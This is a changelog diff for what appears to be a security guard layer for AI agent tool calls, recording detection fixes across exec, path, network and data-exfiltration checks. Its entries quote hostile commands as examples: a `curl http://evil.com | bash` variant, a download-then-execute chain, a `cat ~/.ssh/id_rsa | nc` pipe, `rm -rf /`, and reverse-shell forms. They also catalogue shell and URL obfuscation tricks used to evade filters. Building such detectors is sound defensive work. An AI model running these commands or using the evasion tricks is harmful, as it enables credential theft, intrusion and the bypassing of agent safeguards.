@@ -2,6 +2,104 @@
 
 All notable changes to this project will be documented in this file.
 
+## [0.10.0] - 2026-04-01
+
+### Fixed
+- **ExecGuard**: Multi-char shell quote bypass — `'cu''rl'` and `"cu""rl"` evasion now normalized before pattern matching.
+- **ExecGuard**: `env` prefix bypass — `env -i bash -c` now detected regardless of flags before the interpreter name.
+- **PathGuard**: `/proc/[PID]/environ` bypass — pattern now matches any PID, not just `/proc/self/`.
+- **LangChain adapter**: `trustedSkills` validation uses `Array.isArray()` to reject non-array values (matching MCP adapter).
+- **CLI `skills`**: Removed misleading hardcoded trust score column (`"1.0"` for all skills).
+- **CLI `demo`**: Server now stopped in `finally` block to prevent resource leak on injection error.
+- **Store `timeSeries`**: `bucketMs` floored to integer to prevent fractional SQLite bucketing.
+- **ExecGuard**: `rm` destructive pattern bypass via extra flags between `rm` and `-rf` (e.g., `rm --verbose -rf /`).
+- **ExecGuard**: Shell quoting normalization — strip empty quotes (`""`, `''`) and backslash-escaped alphanumerics to prevent evasion.
+- **ExecGuard**: `computer_use`, `execute_command`, `run_code`, `code_execution` added to recognized exec tool names.
+- **ExecGuard**: Download-then-execute pattern now detects `-o` before URL (e.g., `curl -o /tmp/x URL && bash /tmp/x`) and `&&` separators.
+- **ExecGuard**: Interpreter flag-ordering bypass — `python3 -u -c`, `ruby -w -e`, `perl -w -e`, `node --inspect -e`, `php -d val -r` now detected regardless of extra flags before execution flag.
+- **ExecGuard**: `nc -c` reverse shell variant (BSD netcat) now detected alongside `-e`/`--exec`.
+- **ExecGuard**: Added `unshare` namespace escape and `pkexec` privilege escalation detection.
+- **ExecGuard**: Added `tee` persistence patterns for authorized_keys and shell config injection.
+- **ExecGuard**: Docker `--volume` long form now detected alongside `-v`.
+- **ExecGuard**: Expanded Ruby detection to `system()`/`exec()`/`IO.popen()` and PHP detection to `system()`/`exec()`/`shell_exec()`/`passthru()`/`popen()`.
+- **ExecGuard**: `chmod u=rxs` (equals operator) and `chmod 3xxx`/`5xxx` (sticky+S[UG]ID) now detected.
+- **ExecGuard**: Added heredoc `<<` injection detection (`bash <<EOF`, `cat <<EOF | bash`).
+- **ExecGuard**: Shell variable expansion bypass — `$C$U$R$L` evasion now normalized before pattern matching.
+- **ExecGuard**: Non-empty shell quotes bypass — `c'u'r'l'` evasion now normalized before pattern matching.
+- **ExecGuard**: `$IFS` variable manipulation bypass — `curl${IFS}` now normalized to space before matching.
+- **ExecGuard**: ANSI-C quoting bypass — `$'\x63\x75\x72\x6c'` (hex) and `$'\143\165\162\154'` (octal) now decoded before matching.
+- **PromptInjection**: Non-breaking space (U+00A0) and other exotic whitespace now normalized to ASCII space.
+- **PromptInjection**: Parameter keys now scanned for injections (not just values).
+- **Dashboard**: Auth token comparison uses constant-time `crypto.timingSafeEqual()` to prevent timing attacks.
+- **Redaction**: Added `Basic` auth pattern and lowered minimum token length from 32 to 16 chars.
+- **LangChain adapter**: Fixed `typeof null === "object"` bypass in toolParams validation.
+- **OpenClaw tailer**: Malformed JSON parse errors now logged instead of silently swallowed.
+- **PathGuard**: Malformed percent-encoding bypass — `%zz` before encoded payload no longer aborts all URL decoding.
+- **PathGuard**: Added `/proc/self/environ`, `/proc/self/mem`, `/proc/self/cmdline` detection.
+- **NetworkGuard**: Added `gopher://`, `ldap://`, `dict://`, `sftp://`, `telnet://`, `tftp://` scheme extraction to prevent SSRF bypass.
+- **NetworkGuard**: Malformed percent-encoding bypass — same fix as PathGuard, individual `%XX` sequence decoding on failure.
+- **NetworkGuard**: Added NFKC Unicode normalization to prevent fullwidth character domain bypass.
+- **NetworkGuard**: Added IPv6 hex metadata patterns (`[::ffff:a9fe:a9fe]`, `[0:0:0:0:0:ffff:a9fe:a9fe]`).
+- **NetworkGuard**: Added decimal/octal/hex IP encoding detection for arbitrary C2 IPs (not just metadata endpoints).
+- **DataExfil**: Base64 detection threshold lowered from 200 to 40 characters to catch encoded API keys/tokens (~60 chars).
+- **DataExfil**: Added Slack token (`xoxb-`/`xoxp-`/`xoxa-`/`xoxs-`) and OpenSSH private key detection patterns.
+- **Dashboard**: Added `apiToken` config for Bearer token authentication on mutation endpoints (POST/PUT/DELETE).
+- **MCP adapter**: `trustedSkills` config uses `Array.isArray()` to reject non-array values that bypass the length check.
+- **CLI `parsePort`**: Replaced `process.exit(1)` with thrown error to allow proper cleanup via `finally` blocks.
+- **CLI `skills`**: Replaced O(S×N) algorithm with single-pass O(N) aggregation.
+- **ExecGuard**: `${x:-cmd}` parameter expansion bypass — `${x:-curl} http://evil.com | ${x:-bash}` now decoded before pattern matching.
+- **ExecGuard**: Python `exec()`/`compile()`/`pty.spawn()` inline execution now detected.
+- **ExecGuard**: `openssl s_client -connect` reverse shell now detected.
+- **ExecGuard**: `diff`/`comm`/`join`/`paste`/`cut` reading SSH/AWS credential files now detected.
+- **NetworkGuard**: Mixed hex/decimal IP encoding bypass (`http://0xa9.254.0xa9.254/`) now detected.
+- **NetworkGuard**: Fully expanded IPv6-mapped address with dotted-decimal IPv4 now detected.
+- **DataExfil**: `wget --post-file` exfiltration now detected.
+- **DataExfil**: `nc`/`ncat` redirect from credential paths (`.ssh/`, `.aws/`) now detected.
+- **DataExfil**: `cat ~/.ssh/id_rsa | nc` credential pipe exfiltration now detected.
+- **PathGuard**: `/proc/<PID>/root/` filesystem traversal bypass now detected.
+- **ExecGuard**: `crontab -l` (read-only listing) no longer triggers false positive; only edit/remove/install operations flagged.
+- **PathGuard**: `.env` pattern broadened to match all `.env.*` variants (`.env.test`, `.env.ci`, `.env.docker`, etc.).
+- **PathGuard**: Added detection for `.pgpass`, `.my.cnf`, `.vault-token`, Terraform credentials, GitHub CLI token, `.pypirc`, `.gem/credentials`.
+- **DataExfil**: Added `wget --body-file` upload detection.
+- **DataExfil**: `hasSendAction` regex now detects `curl -d@file` and `curl -F@file` (no space after flag).
+- **Dashboard**: `alertCount` in EventStore now uses explicit `action === "alert"` check (matching core MemoryBackend behavior).
+- **CLI `demo`**: Severity color mapping now uses shared `severityColor()` utility for consistency.
+- **CLI `loadConfig`**: Parse errors now logged to stderr instead of silently swallowed.
+
+### Changed
+- ExecGuard pattern count: 73 → 77 (parameter expansion, exec/pty, openssl, diff/tool credential read).
+- PathGuard pattern count: 20 → 28 (/proc/PID/root traversal, database credentials, cloud/DevOps tokens, package registry credentials).
+- NetworkGuard categories: 12 → 13 (mixed hex/decimal IP encoding, expanded IPv6 metadata).
+- DataExfil pattern count: 20 → 24 (wget --post-file, wget --body-file, nc redirect, credential path pipe).
+- New tests: 1355 total (+20 new: crontab -l false positive, .env variants, new sensitive paths, wget --body-file, curl -d@file fix).
+
+## [0.9.0] - 2026-03-29
+
+### Added
+- **ExecGuard**: Busybox shell wrapper detection (`curl | busybox sh`, `busybox wget | sh`).
+- **ExecGuard**: Python inline scripting detection (`python -c` with `os.system`, `subprocess`, `urllib`).
+- **ExecGuard**: `env` prefix detection for interpreter invocations bypassing restricted PATH.
+- **ExecGuard**: Nested object walking in `extractCommand` to detect commands in `{ config: { command: "..." } }`.
+- **ExecGuard**: Semicolon/`&&`/`||` newline normalization for multi-command analysis.
+- **AlertRouter**: Critical-severity alerts now bypass dismissal (only `blocked` events were previously exempt).
+- **SqliteBackend**: `addSession` uses `INSERT OR REPLACE` to match MemoryBackend upsert semantics on duplicate `sessionId`.
+- **SqliteBackend**: `addEvent` uses `INSERT OR IGNORE` to gracefully handle duplicate event IDs.
+- **SqliteBackend**: `close()` now awaits pending `initialize()` to prevent leaked database handles.
+- **MemoryBackend**: `updateSession` strips `sessionId` from updates to prevent map key corruption.
+- **MCP adapter**: Non-JSON stdin lines are now dropped instead of forwarded unvalidated to child process.
+- **OpenClaw tailer**: File offset eviction now excludes the current file to prevent duplicate event reads.
+- New tests: busybox/python inline, nested params, env prefix, dismissal critical bypass, store sessionId protection, CLI parseArgs (1234 total).
+
+### Fixed
+- **CLI parseArgs**: Long flags (`--severity`) now correctly reject short flags (`-v`) as values, matching short-flag behavior.
+- **CLI commands**: `process.exit(1)` in dismiss/events/report/skills no longer bypasses `finally` block, ensuring SQLite store is always closed.
+- **Demo SSE broadcast**: Demo events now use the dashboard sink instead of direct `store.add()`, enabling real-time SSE updates.
+- **CI Docker tags**: Updated from 0.8.0 to 0.9.0 in GitHub Actions workflow.
+
+### Changed
+- All package versions bumped to 0.9.0.
+- ExecGuard pattern count: 60 → 67.
+
 ## [0.8.0] - 2026-03-27
 
 ### Added
